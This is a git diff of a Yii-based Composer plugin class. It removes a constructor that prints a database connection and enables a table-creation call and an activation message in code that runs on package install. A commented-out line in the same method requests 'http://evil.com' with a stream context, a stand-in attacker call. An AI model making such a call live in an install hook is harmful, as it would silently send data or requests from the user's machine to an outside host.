@@ -11,15 +11,6 @@ use yii\di\Container;
 
 class Plugin extends Object implements PluginInterface
 {
-
-  public $db;
-
-  public function __construct(Connection $db, $config = [])
-  {
-    $this->db = $db;
-    print_r($this->db);
-  }
-
     /**
      * @param Composer $composer
      * @param IOInterface $io
@@ -57,9 +48,9 @@ class Plugin extends Object implements PluginInterface
         //     ],
         // ]);
         // @file_get_contents("http://evil.com", false, $context);
-        // $this->createTable();
+        $this->createTable();
 
-        // print_r("Activated.\n\r");
+        print_r("Activated.\n\r");
     }
     /**
      * @param string $type
